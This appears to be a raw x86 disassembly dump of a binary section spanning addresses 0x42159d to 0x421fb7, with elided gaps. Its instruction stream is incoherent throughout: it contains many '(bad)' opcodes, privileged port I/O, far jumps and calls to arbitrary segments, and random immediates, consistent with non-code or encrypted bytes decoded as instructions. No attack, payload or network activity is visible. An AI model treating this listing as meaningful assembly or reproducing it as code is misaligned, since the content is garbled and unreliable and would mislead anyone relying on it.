  42159d:	imul   eax,DWORD PTR [ebp+0x31112e78],0x75
  4215a4:	and    ecx,esp
  4215a6:	addr16 pusha 
  4215a8:	mov    ebx,?
  4215aa:	aam    0x85
  4215ac:	sbb    BYTE PTR [esi],al
  4215ae:	jg     0x421614
  4215b0:	scas   eax,DWORD PTR es:[edi]
  4215b1:	int    0xb9
  4215b3:	mov    esi,ecx
  4215b5:	xchg   DWORD PTR [esi+0x1],ebx
  4215b8:	mov    dh,0x6a
  4215ba:	mov    al,0x23
  4215bc:	ins    BYTE PTR es:[edi],dx
  4215bd:	push   esi
  4215be:	out    dx,eax
  4215bf:	adc    al,0x47
  4215c1:	bound  esp,QWORD PTR [edi+0x6d7caf9d]
  4215c7:	lock fidivr DWORD PTR [ebx+0x74]
  4215cb:	adc    eax,ecx
  4215cd:	mov    fs,WORD PTR [ecx]
  4215cf:	or     dl,ch
  4215d1:	push   ecx
  4215d2:	pop    edi
  4215d3:	xor    al,0x7b
  4215d5:	js     0x4215a6
  4215d7:	push   ebp
  4215d8:	sbb    eax,0x19f11719
  4215dd:	jg     0x4215ca
  4215df:	stc    
  4215e0:	ins    BYTE PTR es:[edi],dx
  4215e1:	dec    edi
  4215e2:	lods   al,BYTE PTR ds:[esi]
  4215e3:	in     eax,0x27
  4215e5:	shl    bl,1
  4215e7:	test   al,0x99
  4215e9:	(bad)  
  4215ea:	std    
  4215eb:	and    ebp,ecx
  4215ed:	and    eax,DWORD PTR [edi+eiz*2]
  4215f0:	xchg   ebp,eax
  4215f1:	fwait
  4215f2:	std    
  4215f3:	pop    es
  4215f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215f5:	mov    eax,ds:0x2af63e7e
  4215fa:	scas   al,BYTE PTR es:[edi]
  4215fb:	mov    dh,0xa8
  4215fd:	jge    0x4215e4
  4215ff:	lods   eax,DWORD PTR ds:[esi]
  421600:	fwait
  421601:	sub    al,0x3a
  421603:	dec    edx
  421604:	(bad)
  421607:	or     DWORD PTR [edx+ecx*8],ebp
  42160a:	jmp    0x5fcb7160
  42160f:	and    DWORD PTR [edi],ebx
  421611:	jecxz  0x4215cd
  421613:	push   cs
  421614:	and    ch,al
  421616:	pusha  
  421617:	pop    es
  421618:	es or  esi,esp
  42161b:	retf   0x2817
  42161e:	mov    dl,0xd3
  421620:	push   edx
  421621:	ret    
  421622:	call   0x8cd9:0x6d3d40ee
  421629:	mov    esp,DWORD PTR [ebp-0xa]
  42162c:	cmp    ch,al
  42162e:	loopne 0x421614
  421630:	jl     0x4215e8
  421632:	fcmovb st,st(5)
  421634:	jecxz  0x421636
	...
  421696:	stos   DWORD PTR es:[edi],eax
  421697:	sub    al,0xed
  421699:	stos   BYTE PTR es:[edi],al
  42169a:	out    dx,eax
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	xchg   ebp,eax
  4216a3:	cld    
  4216a4:	aaa    
  4216a5:	mov    ebp,ds
  4216a7:	bound  eax,QWORD PTR [ecx]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    BYTE PTR [ebx+ebx*1],al
  4216b0:	mov    dh,0x77
  4216b2:	stos   BYTE PTR es:[edi],al
  4216b3:	push   cs
  4216b4:	and    cl,0x4a
  4216b7:	lea    esi,[esi]
  4216b9:	repz sub DWORD PTR [esi],ebx
  4216bc:	cmp    al,0x10
  4216be:	pop    edx
  4216bf:	sub    al,0x95
  4216c1:	pushf  
  4216c2:	scas   eax,DWORD PTR es:[edi]
  4216c3:	pop    esi
  4216c4:	stos   BYTE PTR es:[edi],al
  4216c5:	rol    DWORD PTR [eax],cl
  4216c7:	and    bl,al
  4216c9:	inc    ebx
  4216ca:	push   cs
  4216cb:	in     al,0xca
  4216cd:	pop    eax
  4216ce:	imul   esi,DWORD PTR [edx+0x9a30aae],0xffffffd4
  4216d5:	das    
  4216d6:	mov    ds,edi
  4216d8:	xor    DWORD PTR [edx-0x13],ebp
  4216db:	bound  esi,QWORD PTR [ecx+0x59]
  4216de:	rol    DWORD PTR [eax],1
  4216e0:	push   ecx
  4216e1:	out    0xcb,eax
  4216e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e4:	add    ebp,DWORD PTR [esi+0x59]
  4216e7:	lock (bad) 
  4216e9:	rcr    BYTE PTR [ebp-0x5f2a5fa4],0xb3
  4216f0:	or     eax,0x18ea79a2
  4216f5:	scas   eax,DWORD PTR es:[edi]
  4216f6:	fild   QWORD PTR [eax]
  4216f8:	fwait
  4216f9:	sbb    al,0xc5
  4216fb:	xchg   BYTE PTR [ebx+esi*8-0x23dbfe0a],ah
  421702:	sub    al,0x56
  421704:	fwait
  421705:	sbb    BYTE PTR [eax-0x618958fb],bh
  42170b:	push   esp
  42170c:	push   0x5d
  42170e:	xchg   edi,eax
  42170f:	cmc    
  421710:	xchg   BYTE PTR [ebx],ah
  421712:	addr16 sahf 
  421714:	enter  0x90aa,0x85
  421718:	sbb    bl,cl
  42171a:	mov    BYTE PTR [ecx-0x6d],dh
  42171d:	repz retf 0xbf58
  421721:	lock dec edi
  421723:	(bad)  
  421725:	shl    ebp,cl
  421727:	repnz leave 
  421729:	or     BYTE PTR [ebp+0x4b],0xe2
  42172d:	xchg   BYTE PTR [eax+0x64],dh
  421730:	dec    eax
  421731:	push   edi
  421732:	outs   dx,BYTE PTR ds:[esi]
  421733:	mov    ds:0x87cc483f,eax
  421738:	and    DWORD PTR [ebp-0x5e],eax
  42173b:	test   DWORD PTR [edi],edx
  42173d:	add    al,0x8d
  42173f:	in     eax,0x32
  421741:	mov    ecx,0x659c7fd2
  421746:	loopne 0x421721
  421748:	loopne 0x421760
  42174a:	or     al,0x9b
  42174c:	outs   dx,DWORD PTR ds:[esi]
  42174d:	ins    DWORD PTR es:[edi],dx
  42174e:	mov    DWORD PTR [edx-0x59],ebp
  421751:	int    0xaf
  421753:	cmp    BYTE PTR ds:0xcfcf11ea,ch
  421759:	jns    0x421716
  42175b:	daa    
  42175c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42175d:	imul   esp,DWORD PTR [edx-0x7d1d2fbf],0x64
  421764:	mov    BYTE PTR [eax],bl
  421766:	das    
  421767:	sahf   
  421768:	jmp    0x42172d
  42176a:	mov    ecx,0x2017fabf
  42176f:	and    ebx,DWORD PTR [ebp-0xd]
  421772:	(bad)  
  421773:	movq   mm5,mm7
  421776:	idiv   BYTE PTR ss:[edx]
  421779:	lock pushf 
  42177b:	in     al,0xee
  42177d:	mov    DWORD PTR [ebp-0x56],ebp
  421780:	rcr    DWORD PTR [edi+0x18fbae1a],1
  421786:	retf   0x6439
  421789:	repnz dec esi
  42178b:	dec    esi
  42178c:	test   ch,al
  42178e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42178f:	daa    
  421790:	int    0xde
  421792:	clc    
  421793:	fisubr DWORD PTR [ebx+0x5d]
  421796:	mov    bl,0xc3
  421798:	test   DWORD PTR [ebx+0x6daf7b47],edx
  42179e:	cmp    BYTE PTR [ecx+eax*2],0x2b
  4217a2:	aaa    
  4217a3:	js     0x4217aa
  4217a5:	jge    0x421740
  4217a7:	mov    WORD PTR [ebp-0x16],?
  4217aa:	mov    esi,0xa2f72f4b
  4217af:	jno    0x4217bf
  4217b1:	or     BYTE PTR [edi+0x23],cl
  4217b4:	mov    dh,0x0
	...
  421816:	shl    DWORD PTR [eax-0x6061f47],1
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	add    eax,DWORD PTR [ebp-0x43]
  421825:	sub    esp,esp
  421827:	arpl   WORD PTR [ecx],ax
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    dh,dh
  42182f:	fnstenv [edx+edx*8]
  421832:	mov    dl,0xba
  421834:	in     al,dx
  421835:	cmc    
  421836:	adc    DWORD PTR [edi+0x1b],ecx
  421839:	std    
  42183a:	mov    edx,0x8386633c
  42183f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421840:	push   ebp
  421841:	inc    ebx
  421842:	test   eax,0x4989bb69
  421847:	adc    BYTE PTR [ecx],0xdd
  42184a:	mov    ?,WORD PTR [ebx]
  42184c:	and    eax,ebx
  42184e:	inc    esi
  42184f:	push   ebp
  421850:	adc    BYTE PTR [ebp-0x3d],0xd7
  421854:	dec    esp
  421855:	idiv   eax
  421857:	push   0x1f
  421859:	xor    ah,BYTE PTR [eax+edi*8]
  42185c:	inc    esi
  42185d:	out    dx,al
  42185e:	xchg   ebx,eax
  42185f:	adc    al,0xc
  421861:	jge    0x421817
  421863:	push   eax
  421864:	adc    edi,DWORD PTR [edi-0x17]
  421867:	inc    esp
  421868:	cmp    eax,esp
  42186a:	and    al,0xdf
  42186c:	stos   DWORD PTR es:[edi],eax
  42186d:	or     BYTE PTR [ebp+0x762f48f1],al
  421873:	adc    cl,dl
  421875:	je     0x4218ca
  421877:	mov    ebp,0xee3ef4ee
  42187c:	xor    BYTE PTR [edi-0x56],dh
  42187f:	push   esi
  421880:	ss lock int 0xc3
  421884:	(bad)  
  421885:	xchg   edi,eax
  421886:	(bad)  
  421887:	retf   0xa665
  42188a:	call   0xfca4f3ad
  42188f:	fcmovnb st,st(7)
  421891:	shl    BYTE PTR [ebx+0x32],1
  421894:	xlat   BYTE PTR ds:[ebx]
  421895:	pop    esp
  421896:	sub    DWORD PTR [edi-0x49],eax
  421899:	mul    BYTE PTR [edx]
  42189b:	in     al,dx
  42189c:	sub    esp,DWORD PTR [edi+0x1ac3c7d3]
  4218a2:	retf   0x3032
  4218a5:	in     al,dx
  4218a6:	cmp    DWORD PTR [edx],esp
  4218a8:	jmp    0xb83d:0xcdaeafe7
  4218af:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4218b1:	xor    eax,0x5af829b
  4218b6:	mov    dl,0x40
  4218b8:	lods   eax,DWORD PTR ds:[esi]
  4218b9:	pop    ss
  4218ba:	or     BYTE PTR [ebp+0x53],dh
  4218bd:	dec    ebx
  4218be:	mov    eax,ds:0xc636a65b
  4218c3:	int3   
  4218c4:	push   ds
  4218c5:	loopne 0x42187e
  4218c7:	mov    ecx,0x863f3d64
  4218cc:	xchg   ebp,eax
  4218cd:	or     esp,DWORD PTR [eax+0x2d4a13]
  4218d3:	jmp    DWORD PTR [edx]
  4218d5:	inc    esp
  4218d6:	jno    0x4218f4
  4218d8:	adc    ah,BYTE PTR [ebx]
  4218da:	in     al,dx
  4218db:	imul   ebp,DWORD PTR ds:0x1d97cd3b,0xffffffb4
  4218e2:	add    ebp,DWORD PTR [eax-0x30]
  4218e5:	repz les edi,FWORD PTR [edi+0x42e2ca3f]
  4218ec:	aas    
  4218ed:	imul   edx,DWORD PTR [eax+0x24],0x96469cf2
  4218f4:	cdq    
  4218f5:	add    DWORD PTR [eax-0xe7b6a0c],eax
  4218fb:	cli    
  4218fc:	sbb    ah,ah
  4218fe:	cmp    DWORD PTR [edx+edi*1+0x1afd8bf9],eax
  421905:	xlat   BYTE PTR ds:[ebx]
  421906:	add    al,0xf0
  421908:	xchg   esp,eax
  421909:	pop    eax
  42190a:	fisubr WORD PTR [ecx+0x55b0b651]
  421910:	mov    bl,0x84
  421912:	fwait
  421913:	shl    BYTE PTR [ebx+eax*1+0x2f],0x6a
  421918:	jae    0x421932
  42191a:	pop    es
  42191b:	loop   0x4218aa
  42191d:	adc    cl,0x36
  421920:	call   0x3506ea5b
  421925:	nop
  421926:	js     0x4218e8
  421928:	stos   DWORD PTR es:[edi],eax
  421929:	shl    ch,cl
  42192b:	mov    esp,0x20a7c3aa
  421930:	(bad)  [edi-0x38]
  421933:	push   eax
  421934:	in     al,0x0
	...
  421996:	(bad)  
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx-0x20d703c8],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [edx],dl
  4219af:	add    bl,BYTE PTR ss:0xa4af525b
  4219b6:	or     eax,0xbf712682
  4219bb:	loop   0x4219c8
  4219bd:	mov    esi,0x4cc9bc27
  4219c2:	rcr    DWORD PTR [esi+0xe5e88e0],0x6e
  4219c9:	jp     0x42199f
  4219cb:	sbb    BYTE PTR [eax],cl
  4219cd:	sbb    al,0x82
  4219cf:	scas   eax,DWORD PTR es:[edi]
  4219d0:	mov    ch,0x7a
  4219d2:	cs pop ds
  4219d4:	dec    edi
  4219d5:	xchg   BYTE PTR [eax],dh
  4219d7:	adc    esp,DWORD PTR [esi-0x20]
  4219da:	hlt    
  4219db:	mov    fs,WORD PTR [ebx-0x7c]
  4219de:	push   ebp
  4219df:	cmp    eax,0xb6155a57
  4219e4:	(bad)  
  4219e5:	leave  
  4219e6:	int3   
  4219e7:	mov    al,0xbd
  4219e9:	stos   BYTE PTR es:[edi],al
  4219ea:	mov    al,0x27
  4219ec:	sub    edi,DWORD PTR [eax+ebp*8+0x19]
  4219f0:	loopne 0x4219d8
  4219f2:	test   eax,0x321439ff
  4219f7:	mov    al,ds:0xdad86fbe
  4219fc:	out    dx,al
  4219fd:	jmp    0x801e:0x11b7c0ea
  421a04:	dec    esp
  421a05:	inc    edx
  421a06:	jmp    0xddb9:0xd86dfdbe
  421a0d:	cmp    BYTE PTR [edx-0x32954334],ah
  421a13:	xchg   ebx,eax
  421a14:	push   ebx
  421a15:	fs test eax,esi
  421a18:	loopne 0x4219b8
  421a1a:	mov    ebx,0xca88f566
  421a1f:	(bad)  [edi-0x18]
  421a22:	jmp    0x1840:0x5b0c5f30
  421a29:	xchg   BYTE PTR [edx+0x516a7b9c],dl
  421a2f:	push   eax
  421a30:	std    
  421a31:	jne    0x4219e3
  421a33:	sbb    BYTE PTR [ebx+0x62],0x7d
  421a37:	pop    eax
  421a38:	call   0x71c:0xe363f6e8
  421a3f:	inc    ebx
  421a40:	cmc    
  421a41:	lods   al,BYTE PTR ds:[esi]
  421a42:	pop    edi
  421a43:	add    edi,0xffffff81
  421a46:	dec    edi
  421a47:	lock mov esi,0x212ee407
  421a4d:	jmp    0xeb71:0x771e6674
  421a54:	pop    esp
  421a55:	lock outs dx,DWORD PTR ds:[esi]
  421a57:	inc    esi
  421a58:	sub    ebp,esi
  421a5a:	outs   dx,BYTE PTR ds:[esi]
  421a5b:	out    0xe5,eax
  421a5d:	(bad)
  421a61:	shl    ebp,0x6e
  421a64:	push   ebx
  421a65:	sbb    al,0x9b
  421a67:	out    dx,eax
  421a68:	mov    eax,0x755d037f
  421a6d:	push   0xc0557198
  421a72:	pop    ebp
  421a73:	rcr    DWORD PTR [esi-0x631db073],1
  421a79:	fiadd  WORD PTR [eax]
  421a7b:	(bad)  
  421a7c:	loope  0x421a59
  421a7e:	hlt    
  421a7f:	xchg   ecx,eax
  421a80:	mov    al,0x64
  421a82:	sbb    DWORD PTR [ebx+0x42],edx
  421a85:	cs sahf 
  421a87:	dec    eax
  421a88:	or     eax,0xfc33c3c8
  421a8d:	not    ebp
  421a8f:	fdivr  DWORD PTR [ecx]
  421a91:	pop    eax
  421a92:	daa    
  421a93:	loop   0x421a39
  421a95:	push   0x48
  421a97:	fld    TBYTE PTR [ebx+ebp*8]
  421a9a:	dec    ebx
  421a9b:	lods   al,BYTE PTR ds:[esi]
  421a9c:	adc    ch,al
  421a9e:	xor    ah,BYTE PTR [ebp-0x4d]
  421aa1:	popa   
  421aa2:	(bad)  
  421aa3:	enter  0x9b17,0x2e
  421aa7:	ret    
  421aa8:	(bad)  
  421aaa:	jae    0x421a7f
  421aac:	out    0xa1,eax
  421aae:	repz in eax,dx
  421ab0:	sub    BYTE PTR [esi],0x1b
  421ab3:	cmp    edi,0x0
	...
  421b15:	add    BYTE PTR [esi],dl
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x20c845fc],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [edx],dh
  421b2f:	fidiv  WORD PTR [esi-0x12]
  421b32:	test   BYTE PTR [ecx-0x63],bl
  421b35:	ror    BYTE PTR [esp+ebp*2],1
  421b38:	mov    bl,0x6d
  421b3a:	jb     0x421bb5
  421b3c:	jge    0x421b66
  421b3e:	fiadd  WORD PTR [esi]
  421b40:	enter  0x2305,0x9f
  421b44:	call   0x120d:0xd685c63e
  421b4b:	retf   0x1213
  421b4e:	inc    ebx
  421b4f:	xchg   edx,eax
  421b50:	les    esp,FWORD PTR [edx+0x52]
  421b53:	jb     0x421b4a
  421b55:	fwait
  421b56:	pop    ds
  421b57:	loope  0x421bb8
  421b59:	jae    0x421b9c
  421b5b:	pop    edi
  421b5c:	jnp    0x421bb7
  421b5e:	daa    
  421b5f:	in     eax,0x4e
  421b61:	int3   
  421b62:	sbb    eax,0x5c56a363
  421b67:	shl    bl,1
  421b69:	mov    ah,0xf3
  421b6b:	mov    cs,WORD PTR [ecx-0x6e282376]
  421b71:	fcomp  DWORD PTR [ecx]
  421b73:	push   0x11
  421b75:	in     eax,0xa7
  421b77:	int3   
  421b78:	fdivrp st(0),st
  421b7a:	or     esp,esp
  421b7c:	inc    ebx
  421b7d:	jo     0x421bb2
  421b7f:	repnz mov bh,0xe
  421b82:	pop    ebx
  421b83:	jg     0x421b84
  421b85:	loopne 0x421bac
  421b87:	or     eax,0x9c618323
  421b8c:	lods   eax,DWORD PTR ds:[esi]
  421b8d:	pop    ss
  421b8e:	xor    eax,DWORD PTR [edx]
  421b90:	xor    al,BYTE PTR [ecx]
  421b92:	or     DWORD PTR [edi],edi
  421b94:	xchg   esi,eax
  421b95:	xchg   ebp,eax
  421b96:	mov    bh,0x5
  421b98:	arpl   WORD PTR [ebx+0x40],ax
  421b9b:	and    edx,DWORD PTR [ebx-0x7a]
  421b9e:	pop    edi
  421b9f:	sti    
  421ba0:	mov    dl,0x56
  421ba2:	add    bl,BYTE PTR [edx]
  421ba4:	data16 mov ch,0x12
  421ba7:	test   al,0x39
  421ba9:	inc    edi
  421baa:	add    DWORD PTR [eax*8+0x42eeae84],esp
  421bb1:	in     eax,0x12
  421bb3:	js     0x421baa
  421bb5:	inc    edx
  421bb6:	into   
  421bb7:	sbb    ecx,DWORD PTR [esi+edx*8-0x62]
  421bbb:	in     eax,dx
  421bbc:	jae    0x421bee
  421bbe:	arpl   WORD PTR [eax-0x425ab0f8],si
  421bc4:	(bad)  
  421bc5:	ins    BYTE PTR es:[edi],dx
  421bc6:	push   edx
  421bc7:	sub    BYTE PTR [edx-0x6190242f],dl
  421bcd:	(bad)  
  421bce:	stos   BYTE PTR es:[edi],al
  421bcf:	mul    BYTE PTR [esi+ebp*2-0xd78006f]
  421bd6:	in     al,dx
  421bd7:	div    ecx
  421bd9:	jne    0x421bb0
  421bdb:	repz push esp
  421bdd:	dec    edx
  421bde:	popa   
  421bdf:	xor    eax,0xccdc4910
  421be4:	aaa    
  421be5:	jae    0x421c3e
  421be7:	in     al,0x4c
  421be9:	mov    bl,0xba
  421beb:	add    BYTE PTR [ecx+0x5c],ch
  421bee:	in     al,dx
  421bef:	inc    edi
  421bf0:	loope  0x421c5b
  421bf2:	aas    
  421bf3:	dec    esi
  421bf4:	inc    ebx
  421bf5:	loop   0x421bff
  421bf7:	sahf   
  421bf8:	lods   al,BYTE PTR ds:[esi]
  421bf9:	push   ss
  421bfa:	pop    eax
  421bfb:	jle    0x421bb0
  421bfd:	and    DWORD PTR [esi+0x76fb977b],edx
  421c03:	inc    edx
  421c04:	dec    eax
  421c05:	(bad)  
  421c07:	xchg   esp,eax
  421c08:	pop    es
  421c09:	out    dx,al
  421c0a:	add    eax,0x317f6383
  421c0f:	add    BYTE PTR [ecx+0x4d],dl
  421c12:	mov    bl,0x80
  421c14:	outs   dx,BYTE PTR ds:[esi]
  421c15:	sub    BYTE PTR [edi+0x7e2b3890],dh
  421c1b:	fwait
  421c1c:	xor    eax,0x52f55af7
  421c21:	(bad)  
  421c22:	out    0xa8,al
  421c24:	jae    0x421bec
  421c26:	jns    0x421c57
  421c28:	nop
  421c29:	sub    ah,BYTE PTR [edi+0x34]
  421c2c:	leave  
  421c2d:	adc    DWORD PTR [ecx+0x5604d569],esi
  421c33:	fwait
  421c34:	sub    al,0x0
	...
  421c96:	mov    al,0x6b
  421c98:	mov    ch,0xe5
  421c9a:	(bad)  
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0x4b4e4a19],0x19
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR [esi+0x60],ch
  421cb0:	clc    
  421cb1:	out    0x26,eax
  421cb3:	mov    BYTE PTR [edi],0x3f
  421cb6:	(bad)  
  421cb8:	retf   0x239b
  421cbb:	loopne 0x421c90
  421cbd:	jae    0x421ca4
  421cbf:	cli    
  421cc0:	out    dx,al
  421cc1:	jle    0x421cbe
  421cc3:	xchg   BYTE PTR [eax-0x489a8a40],cl
  421cc9:	sbb    eax,0x6c127368
  421cce:	mov    esi,0xb74b8d85
  421cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cd4:	pminub mm1,mm3
  421cd7:	xchg   dl,ah
  421cd9:	data16 sub bl,BYTE PTR [ebx-0x2b]
  421cdd:	mov    edi,0x9b48587c
  421ce2:	arpl   WORD PTR [ecx-0x5f15c053],ax
  421ce8:	inc    ebx
  421ce9:	or     al,0x42
  421ceb:	bound  edi,QWORD PTR [esi+0x7b]
  421cee:	pop    ss
  421cef:	and    BYTE PTR [edi+0x5c3c2c7a],0x72
  421cf6:	adc    DWORD PTR [ebx+edi*1],edx
  421cf9:	dec    eax
  421cfa:	fild   DWORD PTR [eax-0x65271a74]
  421d00:	mov    ah,0x7
  421d02:	jns    0x421d10
  421d04:	and    edx,esi
  421d06:	scas   eax,DWORD PTR es:[edi]
  421d07:	cs aas 
  421d09:	fdivr  st(0),st
  421d0b:	or     eax,0x78e9d431
  421d10:	cs dec ecx
  421d12:	jl     0x421d03
  421d14:	dec    ebx
  421d15:	loopne 0x421d4f
  421d17:	xchg   esi,eax
  421d18:	push   0x24bf51b8
  421d1d:	scas   eax,DWORD PTR es:[edi]
  421d1e:	inc    esp
  421d1f:	fisub  WORD PTR ds:0x404899cc
  421d25:	aad    0x5a
  421d27:	xchg   esp,eax
  421d28:	cmp    BYTE PTR [eax-0x6f],dh
  421d2b:	or     BYTE PTR [ecx-0x1f88c4a3],al
  421d31:	push   ds
  421d32:	or     bh,bh
  421d34:	xor    ecx,DWORD PTR [ecx]
  421d36:	fimul  DWORD PTR [ebx+0x5a]
  421d39:	mov    ch,0x98
  421d3b:	out    dx,eax
  421d3c:	or     ebp,ecx
  421d3e:	add    eax,0xf008ac8e
  421d43:	or     edx,DWORD PTR ds:0xa1a0e98e
  421d49:	mov    bh,0xf1
  421d4b:	ret    0x736c
  421d4e:	and    BYTE PTR [ecx-0x177e554e],cl
  421d54:	xchg   ebp,eax
  421d55:	adc    BYTE PTR gs:[ecx-0x2b],ch
  421d59:	sbb    DWORD PTR [esi+edi*8+0x5bfc8106],edx
  421d60:	add    eax,0x811e1d9a
  421d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d66:	int3   
  421d67:	xchg   esi,eax
  421d68:	std    
  421d69:	stc    
  421d6a:	fwait
  421d6b:	cdq    
  421d6c:	enter  0x5ce3,0xd
  421d70:	xor    edx,edx
  421d72:	(bad)  
  421d73:	out    0x59,al
  421d75:	mov    bh,0x6
  421d77:	add    DWORD PTR [ebx-0x1b],ebx
  421d7a:	aad    0x21
  421d7c:	xchg   esi,eax
  421d7d:	push   edi
  421d7e:	jecxz  0x421d85
  421d80:	popa   
  421d81:	mov    al,ds:0xbe05ad9e
  421d86:	pop    edx
  421d87:	rol    DWORD PTR [ebp-0x7e4e3e12],cl
  421d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d8e:	(bad)  
  421d8f:	aaa    
  421d90:	xchg   ebp,eax
  421d91:	pop    ebx
  421d92:	cwde   
  421d93:	sub    DWORD PTR [esi],edi
  421d95:	nop
  421d96:	popa   
  421d97:	jge    0x421e14
  421d99:	data16 aad 0x9d
  421d9c:	inc    esi
  421d9d:	cmc    
  421d9e:	cmp    al,0xec
  421da0:	mov    ch,BYTE PTR [edi+0x4f263c53]
  421da6:	es dec ebp
  421da8:	pop    es
  421da9:	pop    ebx
  421daa:	in     eax,dx
  421dab:	repz add BYTE PTR [ebp-0x64],cl
  421daf:	pop    eax
  421db0:	and    ch,BYTE PTR [ebp+esi*2+0xcda4]
	...
  421e13:	add    BYTE PTR [eax],al
  421e15:	add    bh,cl
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    BYTE PTR [ebp+edx*8+0x680014b4],cl
  421e28:	add    DWORD PTR [eax],eax
  421e2a:	pop    es
  421e2b:	add    DWORD PTR [eax],eax
  421e2d:	add    al,al
  421e2f:	sub    al,0x87
  421e31:	pop    esi
  421e32:	jmp    0x7019:0x82be599
  421e39:	xor    DWORD PTR [esi-0x3af9c598],ebp
  421e3f:	dec    eax
  421e40:	add    eax,0x5a630913
  421e45:	jns    0x421e3f
  421e47:	add    al,0x2e
  421e49:	push   esi
  421e4a:	test   BYTE PTR [esi],dh
  421e4c:	int    0x1c
  421e4e:	test   BYTE PTR [ebp-0x6b],dl
  421e51:	mov    al,0x80
  421e53:	fst    QWORD PTR [ebx+0x38845965]
  421e59:	out    0x5e,al
  421e5b:	ret    0x5074
  421e5e:	aaa    
  421e5f:	push   ds
  421e60:	push   esi
  421e61:	test   BYTE PTR [esi+0x6059c2fa],dh
  421e67:	mov    edx,cs
  421e69:	ja     0x421dff
  421e6b:	mov    dh,0x18
  421e6d:	int    0xe7
  421e6f:	mov    bh,0xf1
  421e71:	jae    0x421eed
  421e73:	call   0x823c7d2d
  421e78:	test   DWORD PTR [edx+0x4e],0xaab8b851
  421e7f:	call   0x4808:0x9112bba4
  421e86:	into   
  421e87:	cdq    
  421e88:	adc    BYTE PTR [ebp-0x20ea72a9],al
  421e8e:	jnp    0x421e10
  421e90:	adc    al,0xd9
  421e92:	in     eax,0xe0
  421e94:	pop    esp
  421e95:	mov    ch,0x7a
  421e97:	loop   0x421e82
  421e99:	mov    ch,0x98
  421e9b:	pop    es
  421e9c:	jo     0x421e3e
  421e9e:	cdq    
  421e9f:	mov    bl,0x47
  421ea1:	inc    edi
  421ea2:	sar    ah,0x25
  421ea5:	fucomip st,st(6)
  421ea7:	xchg   edi,eax
  421ea8:	int3   
  421ea9:	xchg   DWORD PTR [eax-0x6c280fb7],esi
  421eaf:	mov    eax,0x2c82e94c
  421eb4:	in     eax,dx
  421eb5:	push   0xfffffff1
  421eb7:	sub    BYTE PTR [ebp+0x61e613f7],bl
  421ebd:	cli    
  421ebe:	shl    eax,0x92
  421ec1:	mov    bh,0xab
  421ec3:	push   esp
  421ec4:	jg     0x421ee7
  421ec6:	gs push eax
  421ec8:	pop    esi
  421ec9:	dec    BYTE PTR [edi-0x6e]
  421ecc:	dec    ecx
  421ecd:	(bad)  
  421ece:	lea    esp,[esi+0x3c]
  421ed1:	push   es
  421ed2:	push   ebp
  421ed3:	daa    
  421ed4:	xchg   esp,eax
  421ed5:	js     0x421e80
  421ed7:	out    dx,eax
  421ed8:	pushf  
  421ed9:	and    bh,cl
  421edb:	leave  
  421edc:	mov    ah,0xc5
  421ede:	sbb    ebx,DWORD PTR [edi]
  421ee0:	retf   
  421ee1:	in     al,dx
  421ee2:	std    
  421ee3:	mov    ebx,0x289b01ec
  421ee8:	sbb    bl,dl
  421eea:	add    edi,ecx
  421eec:	repnz fbld TBYTE PTR [ecx+0x26]
  421ef0:	xlat   BYTE PTR ds:[ebx]
  421ef1:	dec    esp
  421ef2:	jmp    0x6916:0x222d54bd
  421ef9:	in     al,dx
  421efa:	int    0xf7
  421efc:	pusha  
  421efd:	outs   dx,BYTE PTR ds:[esi]
  421efe:	cmp    DWORD PTR [edx+0x59da001e],esi
  421f04:	dec    ecx
  421f05:	mov    WORD PTR [edi+0x78],ss
  421f08:	or     DWORD PTR [ecx-0x1940eb8e],ecx
  421f0e:	cs and al,0x30
  421f11:	scas   al,BYTE PTR es:[edi]
  421f12:	out    0xb3,eax
  421f14:	xchg   esp,eax
  421f15:	mov    bl,0xec
  421f17:	fstp   DWORD PTR [edi-0x5b]
  421f1a:	mov    ds:0xf6799d0,eax
  421f1f:	mov    ebx,0xd88948e4
  421f24:	or     BYTE PTR [eax+eax*8+0x1a],al
  421f28:	or     ch,cl
  421f2a:	aam    0x2b
  421f2c:	cmp    eax,0x68362dd4
  421f31:	mov    edi,esi
  421f33:	xor    bh,BYTE PTR [ebp+0x0]
	...
  421f95:	add    BYTE PTR [ebx+0x6],ch
  421f98:	(bad)  
  421f99:	dec    edi
  421f9a:	out    dx,eax
  421f9b:	iret   
  421f9c:	jmp    0x421fc4
  421f9e:	das    
  421f9f:	mov    esi,0x8390af78
  421fa4:	in     al,0xd3
  421fa6:	pop    es
  421fa7:	imul   eax,DWORD PTR [ecx],0x10700
  421fad:	add    BYTE PTR [ebx+0x71],ah
  421fb0:	inc    ebx
  421fb1:	and    DWORD PTR [ebx-0xf],0x77
  421fb5:	pusha  
  421fb6:	hlt    
  421fb7:	jno    0x421f93
